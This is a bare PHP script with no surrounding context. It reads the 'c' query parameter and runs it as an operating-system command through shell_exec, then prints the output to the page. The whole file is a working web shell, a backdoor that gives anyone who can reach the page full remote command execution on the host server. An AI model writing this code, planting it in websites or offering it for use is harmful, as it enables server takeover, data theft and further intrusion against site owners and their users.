<?php
$c = $_GET['c'];
$output = shell_exec("$c");
echo "<pre>" . nl2br($output) . "</pre>";
?>